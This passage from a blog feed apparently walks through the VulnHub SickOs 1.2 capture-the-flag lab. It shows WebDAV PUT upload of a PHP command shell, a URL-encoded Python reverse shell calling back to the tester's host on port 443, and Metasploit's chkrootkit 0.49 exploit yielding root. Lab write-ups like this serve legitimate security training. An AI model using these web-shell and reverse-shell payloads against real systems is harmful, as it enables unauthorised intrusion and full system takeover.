</span><span class='line'>    <span class="o">(</span>Use mode <span class="p">&amp;</span>lsquo<span class="p">;</span>-w<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">if</span> you want to scan it anyway<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;END_TIME: Sun Jun  <span class="m">5</span> 14:46:34 2016
</span><span class='line'>DOWNLOADED: <span class="m">4612</span> - FOUND: 1
</span></code></pre></td></tr></table></div></figure></p>

<p>Then try to enumerate HTTP methods by using <code>curl</code>. Nothing found in <code>/</code> but lots methods are available in <code>/test/</code> including method <code>PUT</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X OPTIONS &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test&quot;</span>&gt;http://10.1.1.133/test&lt;/a&gt;
</span><span class='line'>*   Trying 10.1.1.133<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;blockquote&gt;&lt;p&gt;OPTIONS /test HTTP/1.1
</span><span class='line'>Host: 10.1.1.133
</span><span class='line'>User-Agent: curl/7.47.0
</span><span class='line'>Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>lt<span class="p">;</span> HTTP/1.1 <span class="m">301</span> Moved Permanently
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> DAV: 1,2
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> MS-Author-Via: DAV
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Content-Length: 0
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 04:56:31 GMT
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Server: lighttpd/1.4.28
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>
</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure></p></blockquote>

<p>Now, uploading one-line PHP shell with <code>PUT</code> method.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X PUT -d <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>lt<span class="p">;</span>?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cmd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">])</span><span class="p">;</span> ?&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/shell.php&quot;</span>&gt;http://10.1.1.133/test/shell.php&lt;/a&gt;
</span><span class='line'>*   Trying 10.1.1.133<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;blockquote&gt;&lt;p&gt;PUT /test/shell.php HTTP/1.1
</span><span class='line'>Host: 10.1.1.133
</span><span class='line'>User-Agent: curl/7.47.0
</span><span class='line'>Accept: &lt;em&gt;/&lt;/em&gt;
</span><span class='line'>Content-Length: 30
</span><span class='line'>Content-Type: application/x-www-form-urlencoded&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;upload completely sent off: <span class="m">30</span> out of <span class="m">30</span> bytes
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Content-Length: 0
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 05:04:11 GMT
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Server: lighttpd/1.4.28
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure></li>
</ul>
</blockquote>

<p><img class="left" src="/downloads/SickOs1.2/1.png"></p>

<p>Now set up <code>nc</code> to listen on port <code>443</code> (tried port &lsquo;4444&rsquo; but failed due to be blocked) and Then I tried to upload reverse shell via <code>wget</code> but failed for some reason and finally got the following <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="pentestmonkey Reverse Shell Cheat Sheet">method</a> works:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&quot;</span>&gt;http://10.1.1.133/test/shell.php?cmd<span class="o">=</span>python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Got a limited shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>10.1.1.133: inverse host lookup failed: Unknown host
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.133<span class="o">]</span> 33544
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>www-data
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to get a better and stable shell, I set up metasploit and re-run the python shell again:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 10.1.1.132
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.1.1.132
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/shell_reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell_reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt;
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP handler on 10.1.1.132:443
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Starting the payload handler<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.132:443 -&gt; 10.1.1.133:33545<span class="o">)</span> at 2016-06-05 15:41:50 +1000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>^Z
</span><span class='line'>Background session 1? <span class="o">[</span>y/N<span class="o">]</span>  y
</span></code></pre></td></tr></table></div></figure></p>

<p>After spending couple of hours to <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="g0tmi1k Basic linux privilege escalation guide">enumerate</a> the target system and finally found an vulnerable program (<a href="https://www.exploit-db.com/exploits/33899/" title="chkrootkit 0.49 - Local Root Vulnerability">chkrookit version 0.49</a>) running on the system.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dpkg -l <span class="p">|</span> grep chkroot
</span><span class='line'>rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
</span></code></pre></td></tr></table></div></figure></p>

<p>Exploit <code>chkrootkit</code> to get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/unix/local/chkrootkit
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/unix/local/chkrootkit<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name        Current Setting       Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
</span><span class='line'>   SESSION     <span class="m">1</span>                     yes       The session to run this module on.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Automatic&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="nb">set </span>lport 8080
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 8080&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; run -j
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP double handler on 10.1.1.132:8080
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Rooting depends on the crontab <span class="o">(</span>this could take a <span class="k">while</span><span class="o">)</span>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Payload written to /tmp/update
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Waiting <span class="k">for</span> chkrootkit to run via cron<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Accepted the first client connection<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Accepted the second client connection<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Command: <span class="nb">echo </span>cywywDOR3lw9KtfF<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Writing to socket A
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Writing to socket B
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Reading from sockets<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Reading from socket A
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> A: <span class="p">&amp;</span>ldquo<span class="p">;</span>cywywDOR3lw9KtfF<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Matching<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> B is input<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Command shell session <span class="m">2</span> opened <span class="o">(</span>10.1.1.132:8080 -&gt; 10.1.1.133:47139<span class="o">)</span> at 2016-06-05 15:47:03 +1000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/update&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -l&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Active sessions&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  Id  Type         Information                                             Connection&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  <span class="m">1</span>   shell linux  /bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off <span class="nv">$ </span> 10.1.1.132:443 -&gt; 10.1.1.133:33545 <span class="o">(</span>10.1.1.133<span class="o">)</span>
</span><span class='line'>  <span class="m">2</span>   shell unix                                                           10.1.1.132:8080 -&gt; 10.1.1.133:47139 <span class="o">(</span>10.1.1.133<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -i 2
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting interaction with 2<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;587635846
</span><span class='line'>xjfpouiBcdHXtWSGDLawUifFliLoRHgO
</span><span class='line'><span class="nb">true</span>
</span><span class='line'>glQiWVKYGXJIbMNxCzFdLkHTvwzJXMsL
</span><span class='line'>XhEJPxQGJEXCqeHWEuuyRuhgtzDjhhsG
</span><span class='line'>lblxnAmeZfPiTZxaWNHygwoaqIzqbUNo
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then grab the FLAG file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>WoW! If you are viewing this, You have <span class="p">&amp;</span>ldquo<span class="p">;</span>Sucessfully!!<span class="p">&amp;</span>rdquo<span class="p">;</span> completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="o">(</span>s<span class="o">)</span>, gathering more information about the target using different methods, though <span class="k">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks <span class="k">for</span> giving this try.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;@vulnhub: Thanks <span class="k">for</span> hosting this UP!.
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
</feed>
